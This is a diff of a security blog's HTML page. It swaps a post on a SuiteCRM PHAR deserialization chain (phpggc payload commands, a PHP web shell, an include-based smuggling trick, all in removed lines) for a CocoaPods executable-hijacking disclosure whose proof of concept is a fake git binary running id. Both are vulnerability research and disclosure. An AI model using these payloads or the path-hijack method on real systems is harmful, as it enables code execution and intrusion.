@@ -30,24 +30,26 @@
 
   <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.4.1" />
-<meta property="og:title" content="SuiteCRM - Phar Deserialization to Code Execution" />
+<meta property="og:title" content="Disclosure: Local Executable Hijacking in CocoaPods via Unsafe Path Search" />
+<meta name="author" content="snoopysecurity" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="This is a copy of a blog which i recently published on Snyk: https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/" />
-<meta property="og:description" content="This is a copy of a blog which i recently published on Snyk: https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/" />
-<link rel="canonical" href="http://localhost:4000/posts/suitecrm-phar-deserialization/" />
-<meta property="og:url" content="http://localhost:4000/posts/suitecrm-phar-deserialization/" />
+<meta name="description" content="CocoaPods contains an unsafe executable resolution issue in Pod::Executable that may allow arbitrary command execution when running CocoaPods commands inside a directory containing attacker-controlled files." />
+<meta property="og:description" content="CocoaPods contains an unsafe executable resolution issue in Pod::Executable that may allow arbitrary command execution when running CocoaPods commands inside a directory containing attacker-controlled files." />
+<link rel="canonical" href="http://localhost:4000/posts/cocoapods-exe-hijacking/" />
+<meta property="og:url" content="http://localhost:4000/posts/cocoapods-exe-hijacking/" />
 <meta property="og:site_name" content="💻 Blog" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2021-05-09T20:25:52+01:00" />
+<meta property="article:published_time" content="2026-04-22T19:25:52+01:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="SuiteCRM - Phar Deserialization to Code Execution" />
+<meta property="twitter:title" content="Disclosure: Local Executable Hijacking in CocoaPods via Unsafe Path Search" />
 <meta name="twitter:site" content="@snoopysecurity" />
+<meta name="twitter:creator" content="@snoopysecurity" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-09T20:25:52+01:00","datePublished":"2021-05-09T20:25:52+01:00","description":"This is a copy of a blog which i recently published on Snyk: https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/","headline":"SuiteCRM - Phar Deserialization to Code Execution","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/suitecrm-phar-deserialization/"},"url":"http://localhost:4000/posts/suitecrm-phar-deserialization/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"snoopysecurity"},"dateModified":"2026-04-22T19:25:52+01:00","datePublished":"2026-04-22T19:25:52+01:00","description":"CocoaPods contains an unsafe executable resolution issue in Pod::Executable that may allow arbitrary command execution when running CocoaPods commands inside a directory containing attacker-controlled files.","headline":"Disclosure: Local Executable Hijacking in CocoaPods via Unsafe Path Search","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/cocoapods-exe-hijacking/"},"url":"http://localhost:4000/posts/cocoapods-exe-hijacking/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
-  <title>SuiteCRM - Phar Deserialization to Code Execution | 💻 | Blog</title>
+  <title>Disclosure: Local Executable Hijacking in CocoaPods via Unsafe Path Search | 💻 | Blog</title>
 
   <!--
   The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
@@ -437,7 +439,7 @@
         
           
             
-              <span>SuiteCRM - Phar Deserialization to Code Execution</span>
+              <span>Disclosure: Local Executable Hijacking in CocoaPods via Unsafe Path Search</span>
             
 
           
@@ -505,796 +507,6 @@
 
 
 
-  
-  
-
-  
-    
-      
-      
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
-
-  
-
 
 <!-- Add header for code snippets -->
 
@@ -1310,11 +522,6 @@
   
 
   
-
-  
-  
-
-  
     
     
 
@@ -1355,6 +562,54 @@
 
       
     
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
       
 
       
@@ -1396,7 +651,7 @@
 
 <article class="px-1" data-toc="true">
   <header>
-    <h1 data-toc-skip>SuiteCRM - Phar Deserialization to Code Execution</h1>
+    <h1 data-toc-skip>Disclosure: Local Executable Hijacking in CocoaPods via Unsafe Path Search</h1>
     
 
     <div class="post-meta text-muted">
@@ -1413,13 +668,13 @@
 
 <time
   
-  data-ts="1620588352"
+  data-ts="1776882352"
   data-df="ll"
   
     data-bs-toggle="tooltip" data-bs-placement="bottom"
   
 >
-  May  9, 2021
+  Apr 22, 2026
 </time>
 
       </span>
@@ -1438,7 +693,10 @@
 
           <em>
             
-              <a href="https://twitter.com/snoopysecurity">Sam Sanoop</a>
+              
+                
+                
+              
             
           </em>
         </span>
@@ -1468,9 +726,9 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="1715 words"
+  title="402 words"
 >
-  <em>9 min</em> read</span>
+  <em>2 min</em> read</span>
 
         </div>
       </div>
@@ -1479,7 +737,7 @@
 
   
     <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
-      <span class="label text-truncate">SuiteCRM - Phar Deserialization to Code Execution</span>
+      <span class="label text-truncate">Disclosure: Local Executable Hijacking in CocoaPods via Unsafe Path Search</span>
       <button type="button" class="toc-trigger btn me-1">
         <i class="fa-solid fa-list-ul fa-fw"></i>
       </button>
@@ -1492,7 +750,7 @@
 
     <dialog id="toc-popup" class="p-0">
       <div class="header d-flex flex-row align-items-center justify-content-between">
-        <div class="label text-truncate py-2 ms-4">SuiteCRM - Phar Deserialization to Code Execution</div>
+        <div class="label text-truncate py-2 ms-4">Disclosure: Local Executable Hijacking in CocoaPods via Unsafe Path Search</div>
         <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
           <i class="fas fa-close"></i>
         </button>
@@ -1502,137 +760,123 @@
   
 
   <div class="content">
-    <p>This is a copy of a blog which i recently published on Snyk: https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/</p>
+    <p>CocoaPods contains an unsafe executable resolution issue in <code class="language-plaintext highlighter-rouge">Pod::Executable</code> that may allow arbitrary command execution when running CocoaPods commands inside a directory containing attacker-controlled files.</p>
 
-<h3 id="introduction"><span class="me-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<p>The vulnerable logic prepends the current working directory (<code class="language-plaintext highlighter-rouge">./</code>) to the executable search path before trusted system locations. If a malicious repository contains a fake executable such as <code class="language-plaintext highlighter-rouge">git</code>, <code class="language-plaintext highlighter-rouge">tar</code>, or another binary invoked by CocoaPods, that file may be executed instead of the legitimate system binary.</p>
 
-<p>uiteCRM is a free and open source Customer Relationship Management application for servers. This advisory details a PHAR deserialization vulnerability that exists in SuiteCRM which could be leveraged by an authenticated administrator to execute commands on the underlying operating system. This issue has been <a href="https://docs.suitecrm.com/admin/releases/7.11.x/#_7_11_19">fixed in release 7.11.19</a>.</p>
+<p>This can lead to local code execution in the context of the user running CocoaPods.</p>
 
-<p>In PHP, PHAR (PHP Archive) files can be used to package PHP applications and PHP libraries into one archive file. The PHAR format in PHP uses a single file format which can be used to store and execute multiple PHP code. PHAR files contain metadata about the files in the archive. In a PHAR file, this metadata is stored in a serialized format.</p>
+<hr />
 
-<p>If a file operation is performed on a PHAR file via the phar:// wrapper, the PHAR file’s metadata would be unserialized. As such, an attacker could perform PHP object injection without the use of the unserialize() function by uploading a PHAR file. This vulnerability notably gained popularity after Sam Thomas published his research work at BlackHat USA 2018 titled, <a href="https://www.blackhat.com/us-18/briefings/schedule/index.html#its-a-php-unserialization-vulnerability-jim-but-not-as-we-know-it-11078">It’s a PHP Unserialization Vulnerability Jim, but Not as We Know It</a>, which affected multiple Content Management Systems. In order to exploit this vulnerability, two conditions must be met:</p>
+<h3 id="affected-component"><span class="me-2">Affected Component</span><a href="#affected-component" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
 
 <ul>
-  <li>A PHP filesystem function such as “file_exists” that can be controlled which will trigger the unserialize() function</li>
-  <li>The ability to upload a PHAR file with the .phar, .zip, or .jpeg extension to the target system and the path of this file to be known</li>
+  <li><strong>Package:</strong> CocoaPods</li>
+  <li><strong>Module:</strong> <code class="language-plaintext highlighter-rouge">Pod::Executable</code></li>
+  <li><strong>File:</strong> <code class="language-plaintext highlighter-rouge">lib/cocoapods/executable.rb</code></li>
 </ul>
 
-<h3 id="technical-details"><span class="me-2">Technical Details</span><a href="#technical-details" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<p><strong>Reference:</strong><br />
+https://github.com/CocoaPods/CocoaPods/blob/master/lib/cocoapods/executable.rb#L91-L106</p>
 
-<p>1) Root Cause</p>
+<hr />
+<h2 id="technical-details"><span class="me-2">Technical Details</span><a href="#technical-details" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<p>This vulnerability bypasses the security mechanisms implemented by SuiteCRM maintainers as part of their remediation to CVE-2020-8801. As seen in the advisory for <a href="https://packetstormsecurity.com/files/156324/SuiteCRM-7.11.11-Phar-Deserialization.html">CVE-2020-8801</a>, multiple areas within the SuiteCRM administrator panel which includes Backups, Import, and UpgradeWizard areas can be used to trigger PHAR deserialization. This was remediated by the maintainers within release 7.11.13 with commit <a href="https://github.com/salesagility/SuiteCRM/commit/571cbfa209da4c8280a5359f301115de25b4c6e3">571cbfa209da4c8280a5359f301115de25b4c6e3</a>.</p>
+<p>The <code class="language-plaintext highlighter-rouge">which</code> method used by CocoaPods to locate external programs inserts <code class="language-plaintext highlighter-rouge">./</code> at the beginning of the search path:</p>
 
-<p><a href="/assets/img/blog/suitecrm-phar-deserialization/phar1.png" class="popup img-link shimmer"><img src="/assets/img/blog/suitecrm-phar-deserialization/phar1.png" alt="" loading="lazy"></a></p>
-
-<p>The strpos function is used to check if a user parameter contains an occurrence of the phar:// URI. However, due to the usage of the strpos function, this check is case-sensitive. As such, it is possible to bypass this check using capital characters and trigger PHAR deserialization by calling the phar wrapper such as PHAR://.</p>
-
-<p>2) Finding a usable Gadget</p>
-
-<p>While it is possible to bypass the SuiteCRM patch for the PHAR URI check, it was found that SuiteCRM maintainers took precautions to ensure that all possible POP gadgets that could be triggered by an attacker using deserialization cannot be used. This was done by adding a __wakeup magic method into classes that were considered to be dangerous. This method is automatically invoked every time an object is being unserialized and ensures that all of the object’s properties are destroyed upon deserialization. An example of this can be seen below</p>
-
-<p><a href="/assets/img/blog/suitecrm-phar-deserialization/phar2.png" class="popup img-link shimmer"><img src="/assets/img/blog/suitecrm-phar-deserialization/phar2.png" alt="" loading="lazy"></a></p>
-
-<p>Within modules/Import/sources/ImportFile.php, a __destruct magic method exists which could be abused to delete arbitrary files from a system through unsafe deserialization. However, due to the presence of the above __wakeup method, this __destruct method cannot be leveraged by an attacker. This check was found throughout SuiteCRM’s codebase.</p>
-
-<p>However, a closer look at SuiteCRM’s dependencies, it was possible to find a usable __destruct method that could be leveraged for arbitrary file deletion. SuiteCRM uses the zend-gdata library which uses zf1/zend-http as a transitive dependency.</p>
-
-<p>Within the Stream.php file of the zf1/zend-http package, a __destruct method exists which when triggered, will run the @unlink function on the $stream_name property of an object. The @unlink function within this method can be leveraged to delete a file. In order for this function to be triggered, a $_cleanup property should also exist for a given object. The code for this __destruct method can be seen below.</p>
-
-<p><a href="/assets/img/blog/suitecrm-phar-deserialization/phar3.png" class="popup img-link shimmer"><img src="/assets/img/blog/suitecrm-phar-deserialization/phar3.png" alt="" loading="lazy"></a>
-https://github.com/zf1/zend-http/blob/de1e836ea1bc7d5acccc82b1cf4dd236271a21cb/library/Zend/Http/Response/Stream.php#L224-L233</p>
-
-<p>The existence of this gadget is already known and is available for use within the PHPGGC library. PHPGGC is a library of unserialize() payloads along with a script to generate a POP gadget payload based on user given parameters.</p>
-
-<p>Note: If all dev dependencies are also installed within a SuiteCRM installation, a vulnerable release of PHP-CS-Fixer can also be leveraged for Arbitrary FIle Deletion instead of zf1/zend-http. The pull request which integrates this POP gadget to the PHPGGC can be seen here: https://github.com/ambionics/phpggc/pull/93</p>
-
-<p>3) Finding and Abusing an Upload Functionality</p>
-
-<p>While the advisory for <a href="https://packetstormsecurity.com/files/156324/SuiteCRM-7.11.11-Phar-Deserialization.html">CVE-2020-8801</a> explains the parameters and the areas within SuiteCRM that can be used for PHAR deserialization, the advisory and the related blog from the researcher who discovered this issue doesn’t state where a PHAR file can be uploaded or what path/location could be leveraged. Furthermore, it was found that any file that is uploaded to SuiteCRM would be renamed to have no extension and the name of this file would be changed to a random UUID identifier. For example, party-parrot.png uploaded as part of a document will be renamed to 51eea769-ce13-40bb-fb25-60197bf855ae.</p>
-
-<p><a href="/assets/img/blog/suitecrm-phar-deserialization/phar4.png" class="popup img-link shimmer"><img src="/assets/img/blog/suitecrm-phar-deserialization/phar4.png" alt="" loading="lazy"></a></p>
-
-<p>However, after some further walkthrough of all SuiteCRM functionality, it was found that any Module Loader zip uploads do not adhere to this behaviour and module zip uploads are uploaded and saved at an arbitrary location with the .zip extension that can be guessed by an attacker. This can be used to fulfill the requirements of a PHAR deserialization vulnerability. An example of this can be seen below:</p>
-
-<p><a href="/assets/img/blog/suitecrm-phar-deserialization/phar5.png" class="popup img-link shimmer"><img src="/assets/img/blog/suitecrm-phar-deserialization/phar5.png" alt="" loading="lazy"></a></p>
-
-<p>The uploaded examplemodule.zip file will be stored within the following location. The manifest.php file itself is taken from the module.zip directory and it is also available in the same location.</p>
-
-<p><a href="/assets/img/blog/suitecrm-phar-deserialization/phar6.png" class="popup img-link shimmer"><img src="/assets/img/blog/suitecrm-phar-deserialization/phar6.png" alt="" loading="lazy"></a></p>
-
-<p>4) Triggering Arbitrary File Deletion</p>
-
-<p>With the path of an uploaded zip file now known, a file deletion gadget being present, and functions that trigger Phar deserialization being available, it is possible to leverage these conditions to exploit a SuiteCRM installation.</p>
-
-<p>Using <a href="https://github.com/ambionics/phpggc">PHPGGC</a>, an example phar file can be created as follows:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+<div class="language-ruby highlighter-rouge"><div class="code-header">
+        <span data-label-text="Ruby"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>./phpggc -p zip -o /tmp/malicious.zip -f ZendFramework/FD1 /tmp/test.txt
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="n">program</span> <span class="o">=</span> <span class="n">program</span><span class="p">.</span><span class="nf">to_s</span>
+<span class="n">paths</span> <span class="o">=</span> <span class="no">ENV</span><span class="p">.</span><span class="nf">fetch</span><span class="p">(</span><span class="s1">'PATH'</span><span class="p">)</span> <span class="p">{</span> <span class="s1">''</span> <span class="p">}.</span><span class="nf">split</span><span class="p">(</span><span class="no">File</span><span class="o">::</span><span class="no">PATH_SEPARATOR</span><span class="p">)</span>
+<span class="n">paths</span><span class="p">.</span><span class="nf">unshift</span><span class="p">(</span><span class="s1">'./'</span><span class="p">)</span>
+<span class="n">paths</span><span class="p">.</span><span class="nf">uniq!</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>The above command will create a phar file with ZIP format and call it malicious.zip. This will insert a serialized payload of the previously mentioned zf1/zend-http POP gadget and set the $stream_name property of this serialized object to be /tmp/test.txt. Furthermore, the -f option within PHPGGC can also be used to ensure that the serialized object will be destroyed right after the unserialize() call, making the payload more reliable.</p>
+<p>Because the current directory is searched first, CocoaPods may execute a local file matching the expected executable name before checking trusted system locations such as:</p>
 
-<p>Note: In order for this zip file to be accepted by the application, an example manifest.php file should also be added to the zip. This can be done as follows within Linux:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/usr/bin</code></li>
+  <li><code class="language-plaintext highlighter-rouge">/bin</code></li>
+  <li><code class="language-plaintext highlighter-rouge">/usr/local/bin</code></li>
+</ul>
 
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+<p>If a repository or working directory contains a malicious executable named <code class="language-plaintext highlighter-rouge">git</code>, CocoaPods may invoke that file during normal operations.</p>
+
+<hr />
+
+<h2 id="impact"><span class="me-2">Impact</span><a href="#impact" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>Successful exploitation may allow arbitrary code execution with the privileges of the user running CocoaPods.</p>
+
+<p>Potential impact includes:</p>
+
+<ul>
+  <li>Execution of attacker-controlled commands</li>
+  <li>Theft of local credentials or SSH keys</li>
+  <li>Source code exfiltration</li>
+  <li>Local environment compromise</li>
+  <li>Abuse of developer permissions</li>
+</ul>
+
+<hr />
+
+<h2 id="attack-requirements"><span class="me-2">Attack Requirements</span><a href="#attack-requirements" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>An attacker must convince a victim to run CocoaPods commands from a directory containing a malicious executable.</p>
+
+<p>Example scenarios:</p>
+
+<ul>
+  <li>Cloning and opening a malicious repository</li>
+  <li>Extracting an untrusted project archive</li>
+  <li>Working inside a compromised shared directory</li>
+</ul>
+
+<hr />
+
+<h2 id="proof-of-concept"><span class="me-2">Proof of Concept</span><a href="#proof-of-concept" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>Create a fake <code class="language-plaintext highlighter-rouge">git</code> executable:</p>
+
+<div class="language-c highlighter-rouge"><div class="code-header">
+        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>zip -rv malicious.zip manifest.php
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">execl</span><span class="p">(</span><span class="s">"/usr/bin/id"</span><span class="p">,</span> <span class="s">"id"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>Once uploaded, this file will now be located in the upload/upgrades/module directory.</p>
+<p>Compile:</p>
 
-<p><a href="/assets/img/blog/suitecrm-phar-deserialization/phar7.png" class="popup img-link shimmer"><img src="/assets/img/blog/suitecrm-phar-deserialization/phar7.png" alt="" loading="lazy"></a></p>
-
-<p>This file can now be triggered through the Backups section within the SuiteCRM admin panel.</p>
-
-<p><a href="/assets/img/blog/suitecrm-phar-deserialization/phar8.png" class="popup img-link shimmer"><img src="/assets/img/blog/suitecrm-phar-deserialization/phar8.png" alt="" loading="lazy"></a></p>
-
-<p>5) File Deletion to Code Execution</p>
-
-<p>By leveraging file deletion, it is possible to delete application source code files and conduct denial of service attacks. It is also possible to leverage file deletion to execute arbitrary code execution on a SuiteCRM installation by deleting an .htaccess file and accessing uploaded files directly.</p>
-
-<p>The .htaccess is a distributed configuration file, and is how Apache handles configuration changes on a per directory basis. Within a SuiteCRM installation, this file disallows the direct access to directories such as /upload and /files. PHAR deserialization can be leveraged to delete this file. Furthermore, the mainfest.php mentioned previously can be used to smuggle and trigger PHP code.</p>
-
-<p>When a module is uploaded within the Module loader functionality, SuiteCRM expects a manifest.php to also be present. An example of this can be seen below:</p>
-
-<p><a href="/assets/img/blog/suitecrm-phar-deserialization/phar9.png" class="popup img-link shimmer"><img src="/assets/img/blog/suitecrm-phar-deserialization/phar9.png" alt="" loading="lazy"></a></p>
-
-<p>By default, SuiteCRM will ensure that the uploaded file must not contain any suspicious function calls such as “exec” or “system”. A full list of the blacklisted function calls can be seen here: <a href="https://support.sugarcrm.com/Documentation/Sugar_Developer/Sugar_Developer_Guide_9.0/Architecture/Module_Loader/Module_Loader_Restrictions/">Blacklisted Functions</a></p>
-
-<p>This check does not take into account the “include” function. The include function can be used within PHP to include files (local files by default) which are executed as PHP code. So an include function can be smuggled into the manifest file which takes a user parameter (include($_GET[‘p’]);) , an uploaded file (which are renamed by SuiteCRM) can then be provided which contains malicious PHP code to achieve code execution.</p>
-
-<h3 id="phar-deserialization-summary"><span class="me-2">PHAR deserialization summary</span><a href="#phar-deserialization-summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
-
-<p>So, to summarize, PHAR deserialization to code execution is as follows:</p>
-
-<p>1) Upload a file to the SuiteCRM through its normal storage functionality. In this instance the following is uploaded as shell.php: <code class="language-plaintext highlighter-rouge">&lt;?php echo system($_GET["cmd"]); ?&gt;</code></p>
-
-<p><a href="/assets/img/blog/suitecrm-phar-deserialization/phar10.png" class="popup img-link shimmer"><img src="/assets/img/blog/suitecrm-phar-deserialization/phar10.png" alt="" loading="lazy"></a></p>
-
-<p>This is renamed to the file eb7cde01-6190-9ca9-b81b-601998504b41 by the application and stored within the /var/www/html/uploads directory. This UID can be seen in the file URL: http://suitecrm.local/index.php?entryPoint=download&amp;id=eb7cde01-6190-9ca9-b81b-601998504b41&amp;type=Documents</p>
-
-<p>1) Upload a ZIP PHAR archive which, when triggered, will delete the .htaccess file and has a manifest.php which contains smuggled PHP code.</p>
-
-<p>PHPGGC can be used as follows:</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>./phpggc -p zip -o /tmp/maliciousmodule.zip -f ZendFramework/FD1 /var/www/html/.htaccess 
+2
+</pre></td><td class="rouge-code"><pre>gcc git.c <span class="nt">-o</span> git
+<span class="nb">chmod</span> +x git
 </pre></td></tr></tbody></table></code></div></div>
-<p>The following code can then be added to a manifest.php file and then added to the PHAR ZIP archive.</p>
 
-<p><a href="/assets/img/blog/suitecrm-phar-deserialization/phar11.png" class="popup img-link shimmer"><img src="/assets/img/blog/suitecrm-phar-deserialization/phar11.png" alt="" loading="lazy"></a></p>
+<p>Run from the same directory:</p>
 
-<p>This ZIP archive can then be uploaded to the system using the module loader component.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>pod <span class="nt">--help</span>
+</pre></td></tr></tbody></table></code></div></div>
 
-<ol>
-  <li>Trigger the Phar Deserialization by calling the maliciousmodule.zip file</li>
-</ol>
-
-<p>The Backups area can be used to trigger Phar deserialization. The HTTP request send to the application is as follows:</p>
+<p>CocoaPods will invoke the local <code class="language-plaintext highlighter-rouge">./git</code> binary when attempting to execute <code class="language-plaintext highlighter-rouge">git --version</code>.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
         <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
@@ -1645,61 +889,31 @@ https://github.com/zf1/zend-http/blob/de1e836ea1bc7d5acccc82b1cf4dd236271a21cb/l
 7
 8
 9
-10
-11
-12
-13
-14
-15
